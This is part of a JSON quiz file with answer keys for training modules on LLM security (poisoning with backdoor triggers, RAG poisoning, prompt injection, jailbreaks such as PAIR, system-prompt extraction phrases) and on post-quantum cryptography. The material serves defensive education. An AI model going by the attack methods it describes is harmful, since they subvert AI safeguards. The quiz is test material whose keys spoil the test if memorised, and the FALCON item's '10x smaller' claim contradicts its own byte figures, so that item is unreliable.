+          "False — the model behaves normally until a specific trigger phrase is encountered",
+          "True — poisoning corrupts all model outputs uniformly"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In 2023, JFrog researchers found that HuggingFace models using Pickle format could contain payloads that establish reverse shells when loaded by a developer.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which supply chain attack targets developers who mistype package names when running pip install?",
+        "options": [
+          "Typosquatting — publishing a malicious package under a near-identical name",
+          "Dependency confusion — publishing an internal package name to a public registry"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-04": {
+    "questions": [
+      {
+        "q": "The Microsoft Tay chatbot became offensive within 24 hours because attackers exploited its real-time learning mechanism with no content filtering.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A backdoor trigger phrase in a poisoned model causes the model to output a chosen malicious response only when that specific phrase appears in the input.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "RAG poisoning differs from training-time data poisoning in that the attack's effect is persistent across all users who trigger retrieval of the injected document.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What poison rate is sufficient to implant a reliable backdoor trigger in an LLM fine-tuning dataset?",
+        "options": [
+          "As little as 0.1% of training examples",
+          "At least 50% of training examples must be poisoned"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "RLHF poisoning works by having an attacker provide feedback that rewards harmful outputs when a trigger is present and normal outputs otherwise.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-05": {
+    "questions": [
+      {
+        "q": "If an application renders LLM output as raw HTML without sanitization, an attacker can achieve XSS by crafting a prompt that causes the LLM to produce a script tag.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which approach correctly prevents SQL injection when using an LLM to translate natural language into database queries?",
+        "options": [
+          "Have the LLM output structured JSON parameters and construct the query with parameterized statements in application code",
+          "Ask the LLM to include a safety note at the end of every query it generates"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "LLM output should be treated the same as any untrusted user input and sanitized before being passed to downstream systems.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A developer passes LLM-generated shell commands directly to os.system(). An attacker can achieve remote code execution by crafting a prompt that causes the LLM to include a malicious command.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Using subprocess with shell=False and a list of arguments (rather than a raw shell string) prevents command injection from LLM-generated output.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-06": {
+    "questions": [
+      {
+        "q": "An AI agent that can only read emails is significantly safer than one that can both read and send emails when facing prompt injection attacks.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In 2023, AutoGPT's default configuration was exploited via prompt injection from a retrieved web page to perform arbitrary file operations without user approval.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which design principle most directly limits the damage from a successful prompt injection attack on an agentic AI system?",
+        "options": [
+          "Principle of least privilege — grant only the minimum permissions needed for the intended task",
+          "Role-based access control defined inside the system prompt"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Irreversible agent actions such as deleting files, sending emails, and making purchases should require explicit human-in-the-loop confirmation.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An LLM agent can reliably self-limit its own capabilities at runtime, so it is safe to configure it with broad tool access.",
+        "options": [
+          "False — agent capabilities must be scoped at design time; the LLM cannot be trusted to self-limit",
+          "True — a well-prompted LLM will always refuse to abuse its tools"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-07": {
+    "questions": [
+      {
+        "q": "Microsoft's Bing Chat internal codename 'Sydney' and its full system prompt were extracted and published publicly within days of the product's launch.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which of the following is a safe use of a system prompt?",
+        "options": [
+          "Storing behavioral instructions and persona rules for the assistant",
+          "Storing production API keys and database credentials"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A role-play jailbreak such as 'pretend you are a robot that recites its programming' can bypass a naive filter that only blocks the exact phrase 'repeat your system prompt'.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Instructing the model to refuse system prompt disclosure in the system prompt itself is a complete security control that prevents extraction.",
+        "options": [
+          "False — it adds friction but a motivated attacker can still extract system prompt contents",
+          "True — a direct refusal instruction makes the system prompt unextractable"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Runtime-injected user PII in system prompts (e.g., 'The user's name is Alice, balance is $50,000') is at risk of extraction via the same techniques used for system prompt leakage.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-08": {
+    "questions": [
+      {
+        "q": "RAG poisoning is more persistent than a single-conversation prompt injection because the poisoned document remains in the vector store and affects every user who retrieves it.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A RAG pipeline that ingests user-submitted feedback forms without content filtering is vulnerable to persistent vector store poisoning.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Research has demonstrated that text embeddings stored in vector databases can be partially inverted to recover approximate original text, posing a privacy risk.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which control best prevents cross-user data leakage in a multi-tenant RAG system?",
+        "options": [
+          "Enforce per-user document access controls in the vector database at retrieval time",
+          "Instruct the LLM to only answer questions relevant to the current user"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An attacker who can write to a vector database can craft a document that is semantically retrieved for target queries and contains embedded prompt injection payloads.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-09": {
+    "questions": [
+      {
+        "q": "In 2023, attorney Steven Schwartz was sanctioned for filing a legal brief that cited six non-existent court cases generated by ChatGPT.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "LLM hallucination is a consequence of how language models work — they predict the next plausible token rather than retrieving verified facts.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Sycophancy in LLMs refers to the tendency to abandon a correct answer and agree with the user's incorrect assertion when pushed back on.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which mitigation best reduces hallucination risk in a high-stakes domain such as legal or medical research?",
+        "options": [
+          "Retrieval-augmented generation grounded in verified source documents with mandatory citation verification",
+          "Increasing the LLM's temperature to generate more diverse responses"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A language model that generates a plausible-sounding but non-existent academic citation has made a factual error it will acknowledge if asked again.",
+        "options": [
+          "False — LLMs may confidently repeat hallucinated citations without self-correction",
+          "True — LLMs reliably flag their own hallucinations when queried"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-10": {
+    "questions": [
+      {
+        "q": "A denial-of-wallet attack against an LLM API exploits pay-per-token pricing by flooding the application with maximum-length requests to exhaust the operator's budget.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In 2024, a coding assistant startup received a $40,000 LLM API bill within 48 hours because it offered an unlimited free trial with no input token caps or rate limiting.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which combination of controls most effectively prevents an unbounded consumption attack on an LLM-powered endpoint?",
+        "options": [
+          "Hard input/output token caps, per-user rate limiting, and a spend alert with a hard budget ceiling",
+          "Asking users to agree to a terms of service prohibiting abuse"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A sponge attack targets LLM systems by crafting inputs that maximize GPU computation time relative to token count, not just total token volume.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Free-tier and trial users should have stricter token and rate limits than paying users because they represent the primary attack surface for denial-of-wallet attacks.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-11": {
+    "questions": [
+      {
+        "q": "LLM red teaming covers both safety failures (harmful content, jailbreaks) and security vulnerabilities (OWASP LLM Top 10) in the deployed application stack.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The PAIR (Prompt Automatic Iterative Refinement) technique uses an attacker LLM to iteratively refine prompts against a target LLM until a jailbreak succeeds.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Before GPT-4's public release, red team evaluations found it could provide meaningful uplift for bioweapon synthesis questions, motivating additional safety training.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which open-source tool automatically probes LLMs with hundreds of attack patterns across jailbreak categories?",
+        "options": [
+          "Garak — an LLM vulnerability scanner",
+          "Metasploit — a traditional penetration testing framework"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "LLM red teaming is a one-time pre-deployment activity because once the model passes an evaluation it is no longer at risk from new jailbreak techniques.",
+        "options": [
+          "False — red teaming must be ongoing because new attack techniques emerge continuously",
+          "True — a passed red team evaluation certifies the model as safe indefinitely"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "llm-12": {
+    "questions": [
+      {
+        "q": "The NIST AI Risk Management Framework defines four core functions: Govern, Map, Measure, and Manage, which together provide the governance layer for an LLM security program.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Traditional WAFs and SIEM tools alone are sufficient to monitor production LLM applications for prompt injection and hallucination incidents.",
+        "options": [
+          "False — AI-specific tooling such as prompt injection classifiers and output validators is also required",
+          "True — existing security monitoring infrastructure covers all LLM-specific threats"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "A Model Bill of Materials (MBOM) documents the provenance of base models, fine-tuning datasets, and dependencies used in an LLM application — analogous to a software SBOM.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which layer of defense-in-depth addresses prompt injection, least-privilege agents, and output sanitization in an LLM security program?",
+        "options": [
+          "Application controls layer",
+          "Model supply chain layer"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The EU AI Act and the US Executive Order on AI both reference the NIST AI RMF as a baseline framework for AI risk management.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-01": {
+    "questions": [
+      {
+        "q": "A qubit in superposition represents both 0 and 1 simultaneously until it is measured.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which algorithm exploits quantum superposition to break RSA encryption in polynomial time?",
+        "options": [
+          "Shor's Algorithm",
+          "Grover's Algorithm"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Q-Day refers to the day a Cryptographically Relevant Quantum Computer (CRQC) capable of breaking RSA becomes operational.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Hadamard gate applied to n qubits creates a superposition of how many states simultaneously?",
+        "options": [
+          "2^n states — all at once",
+          "n states — one per qubit"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Intelligence agencies like CISA and NSA say organizations should wait until Q-Day arrives before beginning post-quantum migration.",
+        "options": [
+          "False — migration should begin now; it takes years",
+          "True — migration is premature until hardware is proven"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-02": {
+    "questions": [
+      {
+        "q": "Shor's Algorithm breaks RSA by factoring large numbers in polynomial time using a quantum computer.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which cryptographic systems does Shor's Algorithm threaten simultaneously?",
+        "options": [
+          "RSA, Diffie-Hellman, and Elliptic Curve Cryptography",
+          "AES-256 and SHA-384 only"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What quantum technique does Shor's Algorithm use to find the period needed for factoring?",
+        "options": [
+          "Quantum Fourier Transform",
+          "Hadamard gate superposition only"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The NSA's CNSA Suite 2.0 (2022) mandated that all National Security Systems migrate away from RSA and ECC by 2035.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Approximately how many logical qubits does Shor's Algorithm require to factor an RSA-2048 key?",
+        "options": [
+          "~4096 logical qubits",
+          "~128 logical qubits"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-03": {
+    "questions": [
+      {
+        "q": "Grover's Algorithm provides a quadratic speedup for search, effectively halving the security of symmetric encryption.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "After a CRQC runs Grover's Algorithm against AES-128, its effective security drops to approximately what level?",
+        "options": [
+          "64 bits — feasibly breakable",
+          "128 bits — still fully secure"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "AES-256 is considered quantum-safe against Grover's Algorithm because its post-Grover security remains at 128 bits.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which symmetric algorithm does NIST recommend as the minimum for long-term quantum resistance?",
+        "options": [
+          "AES-256 and SHA-384",
+          "AES-128 and SHA-256"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Grover's Algorithm completely breaks symmetric encryption the same way Shor's breaks RSA.",
+        "options": [
+          "False — Grover's weakens symmetric crypto but does not fully break it",
+          "True — Grover's renders AES totally insecure"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-04": {
+    "questions": [
+      {
+        "q": "Harvest Now, Decrypt Later (HNDL) attacks are already occurring today — nation-states are collecting encrypted traffic for future quantum decryption.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which data types are considered highest priority for immediate post-quantum migration due to HNDL?",
+        "options": [
+          "Classified communications, medical records, and financial data with long retention periods",
+          "Short-lived session tokens and streaming video encryption"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "TLS forward secrecy (ECDHE) fully protects captured traffic against a future HNDL attack using a CRQC.",
+        "options": [
+          "False — the key exchange itself uses RSA/ECC which Shor's can break",
+          "True — forward secrecy makes HNDL impossible"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In an HNDL attack, what does the adversary do at Q-Day with the captured TLS session?",
+        "options": [
+          "Runs Shor's Algorithm to factor the server's RSA public key and recover the session key",
+          "Brute-forces the AES session key directly"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "CISA's 2023 advisory explicitly confirmed that adversaries may be storing encrypted data today to decrypt it with future quantum computers.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-05": {
+    "questions": [
+      {
+        "q": "Quantum entanglement allows measuring one qubit to instantaneously determine the state of its entangled partner, regardless of distance.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What is the primary security advantage of entanglement-based QKD (E91 protocol) over classical key exchange?",
+        "options": [
+          "Eavesdropping is detectable by physics — it disturbs the entangled state",
+          "The key is longer and therefore harder to brute-force"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Cisco Universal Quantum Switch announced in April 2026 requires cryogenic cooling to operate.",
+        "options": [
+          "False — it operates at room temperature over standard telecom fiber",
+          "True — cryogenic cooling is mandatory for all quantum switches"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the E91 QKD protocol, a Quantum Bit Error Rate (QBER) above what threshold indicates an eavesdropper?",
+        "options": [
+          "11% — above this the key exchange is aborted",
+          "50% — only majority errors signal an eavesdropper"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Cisco SKIP interface connects quantum key material from QKD systems directly into Cisco IPsec and MACsec sessions.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-06": {
+    "questions": [
+      {
+        "q": "NISQ-era quantum computers (50–1000 qubits) are currently capable of running Shor's Algorithm to break RSA-2048.",
+        "options": [
+          "False — NISQ devices lack the qubit count and error correction needed",
+          "True — modern NISQ devices can already break RSA-2048"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Google's Willow processor (2024) achieved which key milestone on the path to fault-tolerant quantum computing?",
+        "options": [
+          "Below-threshold quantum error correction — more qubits reduced error rate",
+          "Factoring a 2048-bit RSA key for the first time"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Current quantum computers have physical qubit error rates that make running Shor's Algorithm on RSA-2048 immediately feasible.",
+        "options": [
+          "False — error rates require ~4 million physical qubits to achieve the necessary logical qubit count",
+          "True — current hardware has error rates low enough to factor RSA-2048"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "IBM's quantum roadmap targets over 100,000 qubits by which year?",
+        "options": [
+          "2033",
+          "2028"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The NISQ era means the cryptographic threat from quantum computing is real but migration can safely begin later, after CRQC hardware is proven.",
+        "options": [
+          "False — migration takes 3–7 years and must begin before CRQC arrives",
+          "True — organizations should wait for confirmed CRQC hardware before acting"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-07": {
+    "questions": [
+      {
+        "q": "Quantum Error Correction (QEC) works by directly copying and checking each qubit's state, similar to classical error correction.",
+        "options": [
+          "False — the no-cloning theorem prevents copying qubits; QEC uses redundancy across physical qubits without measuring the logical state",
+          "True — QEC copies each qubit for parity checking"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Surface Code is the leading QEC scheme, requiring approximately how many physical qubits per logical qubit at current error rates?",
+        "options": [
+          "~1000 physical qubits per logical qubit",
+          "~10 physical qubits per logical qubit"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Google Willow (2024) demonstrated 'below-threshold' error correction, meaning that adding more error-correction qubits actually decreased the logical error rate.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Running Shor's Algorithm on RSA-2048 at Willow-class fidelity (d=9 surface code) would require approximately how many physical qubits?",
+        "options": [
+          "~600,000 physical qubits",
+          "~4,000 physical qubits"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Willow milestone means that the engineering path to a CRQC is now blocked by fundamental physics limitations.",
+        "options": [
+          "False — Willow shows fault-tolerant QC is achievable; the remaining challenge is engineering scale",
+          "True — fundamental physics prevents scaling beyond Willow"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-08": {
+    "questions": [
+      {
+        "q": "In the CISA quantum risk framework, an internet-facing system holding patient records with 50-year retention is classified as a Priority 1 asset requiring immediate migration.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What is the first step CISA's Quantum Readiness Roadmap requires organizations to complete?",
+        "options": [
+          "Comprehensive cryptographic inventory — find all RSA/ECC assets before migrating",
+          "Immediately replace all RSA certificates with ML-KEM"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An asset is at HNDL risk if its data sensitivity lifetime plus the current year exceeds the estimated Q-Day year.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which post-quantum algorithm does CISA and NSA recommend for replacing RSA and ECDH key exchange?",
+        "options": [
+          "CRYSTALS-Kyber (ML-KEM, FIPS 203)",
+          "SHA-384 with doubled key length"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Short-lived data such as session tokens and streaming video encryption requires the same immediate migration urgency as classified government communications.",
+        "options": [
+          "False — migration is prioritized by data sensitivity lifetime; short-lived data has lower urgency",
+          "True — all RSA/ECC must be replaced simultaneously regardless of data lifetime"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-09": {
+    "questions": [
+      {
+        "q": "Quantum Random Number Generators (QRNGs) produce genuinely non-deterministic output because quantum measurement outcomes have no hidden variables.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Dual EC DRBG backdoor worked because the NSA secretly chose elliptic curve constants where they knew the discrete logarithm relationship between two points.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Classical Cryptographically Secure PRNGs (CSPRNGs) like /dev/urandom are deterministic, meaning they are fundamentally less unpredictable than QRNG.",
+        "options": [
+          "True — CSPRNGs are seed-dependent while QRNG exploits quantum non-determinism",
+          "False — CSPRNGs are equally random to QRNG at the physics level"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "NIST withdrew Dual EC DRBG from all standards after the backdoor was confirmed via Snowden documents in 2013.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "For high-security key generation (long-lived secrets, certificate authorities), which entropy source does NIST SP 800-90B recommend as the highest tier?",
+        "options": [
+          "QRNG (quantum random number generator)",
+          "OS-level CSPRNG from hardware noise"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-10": {
+    "questions": [
+      {
+        "q": "NIST published the first standardized post-quantum cryptographic algorithms (FIPS 203, 204, 205) in August 2024.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The Five Eyes intelligence community consensus for the CRQC planning horizon (when classified systems must be fully migrated) is which timeframe?",
+        "options": [
+          "2030–2035",
+          "2045–2050"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Enterprise cryptographic migrations typically take 3–7 years, meaning organizations that start in 2024 can realistically complete P1 migrations by 2030.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In the PQC migration priority order, which action should organizations take first to immediately stop HNDL exposure?",
+        "options": [
+          "Replace RSA/ECDH key exchange with ML-KEM — no CA infrastructure change required",
+          "Replace all digital signatures with ML-DSA before touching key exchange"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The NSA's CNSA Suite 2.0 timeline allows organizations to keep using RSA and ECC in classified National Security Systems indefinitely as long as key sizes are increased.",
+        "options": [
+          "False — RSA/ECC are disallowed in all NSS by 2035 regardless of key size",
+          "True — doubling RSA key size provides sufficient quantum resistance past 2035"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b01": {
+    "questions": [
+      {
+        "q": "How many algorithms were originally submitted to the NIST Post-Quantum Cryptography competition in 2016?",
+        "options": [
+          "69 algorithms",
+          "42 algorithms"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: FIPS 203 standardizes ML-DSA (CRYSTALS-Dilithium) for digital signatures.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which algorithm was broken by a single researcher in approximately 1 hour in July 2022, despite being a NIST Round 4 finalist?",
+        "options": [
+          "SIKE/SIDH",
+          "RAINBOW"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: SLH-DSA (SPHINCS+) relies on lattice hardness assumptions for its security.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which NIST FIPS standard covers ML-KEM (CRYSTALS-Kyber) for key encapsulation?",
+        "options": [
+          "FIPS 203",
+          "FIPS 204"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b02": {
+    "questions": [
+      {
+        "q": "What does the 'E' stand for in the LWE (Learning With Errors) problem?",
+        "options": [
+          "Errors",
+          "Encryption"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: The noise vector in LWE can be removed without a significant performance cost, making LWE easy to solve classically.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Who introduced the Learning With Errors problem in 2005?",
+        "options": [
+          "Oded Regev",
+          "Peter Shor"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Quantum algorithms (such as Grover's and Shor's) provide only a polynomial speedup over classical attacks against LWE.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which variant of LWE is used in ML-KEM and ML-DSA for better performance while keeping the same hardness guarantees?",
+        "options": [
+          "Module-LWE",
+          "Ring-LWE"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b03": {
+    "questions": [
+      {
+        "q": "True or False: In ML-KEM key exchange, the shared secret is transmitted directly from Bob to Alice over the network.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which ML-KEM parameter set is recommended for most general-purpose applications (NIST security level 3)?",
+        "options": [
+          "ML-KEM-768",
+          "ML-KEM-512"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Cisco Silicon One P200 delivers ML-KEM key encapsulation at 800G line rate in hardware without a performance penalty.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What is the public key size for ML-KEM-768?",
+        "options": [
+          "1184 bytes",
+          "256 bytes"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: ML-KEM (FIPS 203) is a drop-in replacement for RSA and ECDH key exchange in protocols like TLS and IKEv2.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b04": {
+    "questions": [
+      {
+        "q": "True or False: ML-DSA (FIPS 204) produces smaller signatures than ECDSA-256.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which hardness problem does ML-DSA rely on for its security?",
+        "options": [
+          "Module-LWE and Module-SIS",
+          "RSA integer factorization"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Cisco deploys ML-DSA only in TLS handshakes, not in firmware boot chain or IPsec.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which signing technique does ML-DSA use to ensure signatures don't leak private key information?",
+        "options": [
+          "Rejection sampling",
+          "Padding oracle"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Approximately how large is an ML-DSA-65 signature?",
+        "options": [
+          "3293 bytes",
+          "64 bytes"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b05": {
+    "questions": [
+      {
+        "q": "True or False: SLH-DSA (SPHINCS+) relies solely on hash function security, with no algebraic hardness assumptions.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which use case is SLH-DSA most strongly recommended for, given its conservative security assumptions?",
+        "options": [
+          "Root CA signing",
+          "High-volume TLS leaf certificate signing"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: SLH-DSA requires state management between signatures, similar to the original XMSS scheme.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "What is the approximate signature size for the SLH-DSA-SHA2-128s parameter set?",
+        "options": [
+          "7856 bytes",
+          "666 bytes"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: If lattice-based algorithms like ML-DSA were broken, SLH-DSA would also immediately become insecure.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      }
+    ]
+  },
+  "quantum-b06": {
+    "questions": [
+      {
+        "q": "Which mathematical structure does FALCON (FN-DSA) use as its security foundation?",
+        "options": [
+          "NTRU lattices",
+          "Module-LWE lattices"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: FALCON-512 produces smaller signatures than ML-DSA-44, making it preferred for bandwidth-constrained IoT deployments.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: FALCON is simpler and safer to implement from scratch than ML-DSA, making it the default recommendation for most enterprise applications.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "What technique does FALCON use to achieve its compact signature sizes?",
+        "options": [
+          "Fast Fourier Transform Gaussian sampling",
+          "Rejection sampling over polynomial rings"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Approximately how large is a FALCON-512 signature compared to an ML-DSA-44 signature?",
+        "options": [
+          "Roughly 10x smaller (666 bytes vs 2420 bytes)",
+          "Roughly the same size"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b07": {
+    "questions": [
+      {
+        "q": "True or False: In a hybrid key exchange (X25519 + ML-KEM-768), an attacker must break BOTH algorithms simultaneously to recover the session key.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which hash-based key derivation function is used to combine the classical and PQC shared secrets in a hybrid scheme?",
+        "options": [
+          "HKDF-SHA384",
+          "PBKDF2-SHA256"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Deploying hybrid TLS (X25519MLKEM768) requires changes to the existing Certificate Authority infrastructure before it can be used.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which organization first deployed hybrid X25519Kyber768 in production, protecting millions of HTTPS connections?",
+        "options": [
+          "CloudFlare",
+          "Let's Encrypt"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Pure ML-KEM (without X25519) is the recommended long-term goal, with hybrid serving as a bridge during the migration period.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b08": {
+    "questions": [
+      {
+        "q": "True or False: Deploying PQC key exchange in TLS (Layer 1) requires updating existing CA-issued certificates before it can protect sessions from HNDL attacks.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which OpenSSL-compatible provider enables PQC ciphersuites including X25519MLKEM768 in TLS 1.3 today?",
+        "options": [
+          "OQS provider (Open Quantum Safe)",
+          "BouncyCastle PQC extension"
+        ],
+        "correct": 0
+      },
